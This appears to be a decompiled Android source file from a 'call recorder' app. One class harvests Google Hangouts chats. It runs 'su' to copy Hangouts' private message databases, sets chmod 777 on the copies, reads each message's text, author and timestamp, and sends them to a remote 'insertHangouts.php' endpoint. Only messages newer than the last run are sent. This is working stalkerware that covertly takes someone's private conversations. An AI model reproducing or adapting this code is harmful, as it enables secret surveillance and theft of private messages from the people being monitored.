package com.yasoka.spcallrecord.recorder.call.a.c.d;

import a.c.e.c;
import a.c.e.e;
import a.c.f.a;
import android.content.Context;
import android.database.Cursor;
import com.crashlytics.android.Crashlytics;
import java.io.DataOutputStream;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

/* compiled from: GetDataHangouts */
public class d extends h implements Runnable {

    /* renamed from: b reason: collision with root package name */
    public static boolean f161b;

    /* renamed from: a reason: collision with root package name */
    private final Context f162a;

    public d(Context context) {
        this.f162a = context;
    }

    /* JADX WARNING: Removed duplicated region for block: B:31:0x00f2  */
    private void a(Context context, String str, long j) throws Exception {
        long j2;
        String str2;
        Context context2 = context;
        a aVar = new a(context2, c.a(), str);
        aVar.b();
        long j3 = j;
        Cursor d2 = aVar.d("messages", j3);
        if (d2 == null) {
            return;
        }
        if (d2.getCount() <= 0) {
            a(aVar, d2);
            return;
        }
        try {
            SimpleDateFormat d3 = a.c.j.c.d();
            j2 = j3;
            while (d2.moveToNext()) {
                try {
                    long j4 = d2.getLong(d2.getColumnIndexOrThrow("timestamp"));
                    Date date = new Date();
                    date.setTime(j4);
                    Date date2 = new Date();
                    date2.setTime(e.p(context));
                    Calendar instance = Calendar.getInstance();
                    instance.setTime(date2);
                    instance.add(13, 1);
                    if (date.compareTo(instance.getTime()) > 0) {
                        String string = d2.getString(d2.getColumnIndexOrThrow("text"));
                        int i = d2.getInt(d2.getColumnIndexOrThrow("type"));
                        Cursor a2 = aVar.a("participants", "gaia_id", d2.getString(d2.getColumnIndexOrThrow("author_gaia_id")));
                        if (a2.moveToFirst()) {
                            String str3 = "full_name";
                            if (i == 1) {
                                str2 = a2.getString(a2.getColumnIndexOrThrow(str3));
                            } else {
                                a2.moveToLast();
                                str2 = a2.getString(a2.getColumnIndexOrThrow(str3));
                            }
                            StringBuilder sb = new StringBuilder();
                            sb.append("");
                            sb.append(i);
                            a(context, str2, string, sb.toString(), d3.format(Long.valueOf(date.getTime() / 1000)), "socialNetwork/root/insertHangouts.php");
                            j2 = j4;
                        }
                    }
                } catch (Exception e2) {
                    e = e2;
                    e.getStackTrace();
                    try {
                        e.getStackTrace();
                        Crashlytics.logException(e);
                    } catch (Exception unused) {
                    }
                    if (j2 != 0) {
                    }
                    a(aVar, d2);
                }
            }
        } catch (Exception e3) {
            e = e3;
            j2 = j3;
            e.getStackTrace();
            e.getStackTrace();
            Crashlytics.logException(e);
            if (j2 != 0) {
            }
            a(aVar, d2);
        }
        if (j2 != 0) {
            a.b.a.a.a.a(context2.getSharedPreferences("user", 0), "timehangouts", j2);
        }
        a(aVar, d2);
    }

    public void run() {
        String str = "\n";
        String str2 = "hangoutsMessages.db";
        try {
            Thread.sleep(200);
        } catch (InterruptedException e2) {
            e2.printStackTrace();
        }
        if (f161b) {
            a(this.f162a);
            return;
        }
        f161b = true;
        try {
            if (e.p(this.f162a) == 0) {
                c.e(this.f162a);
            }
            if (e.p(this.f162a) != 0) {
                long p = e.p(this.f162a);
                DataOutputStream dataOutputStream = new DataOutputStream(Runtime.getRuntime().exec("su").getOutputStream());
                StringBuilder sb = new StringBuilder();
                sb.append("cat ");
                sb.append("/data/data/com.google.android.talk/databases/");
                sb.append("babel*.db");
                sb.append(" > ");
                sb.append(c.a());
                sb.append(str2);
                sb.append(str);
                dataOutputStream.writeBytes(sb.toString());
                StringBuilder sb2 = new StringBuilder();
                sb2.append("chmod 777 ");
                sb2.append(c.a());
                sb2.append("* \n");
                dataOutputStream.writeBytes(sb2.toString());
                StringBuilder sb3 = new StringBuilder();
                sb3.append("chmod -R 777 ");
                sb3.append(c.a());
                sb3.append(str);
                dataOutputStream.writeBytes(sb3.toString());
                dataOutputStream.flush();
                dataOutputStream.writeBytes("exit\n");
                dataOutputStream.flush();
                Thread.sleep(10000);
                a(this.f162a, str2, p);
            }
        } catch (Exception e3) {
            e3.getStackTrace();
        }
        f161b = false;
        a(this.f162a);
    }
}
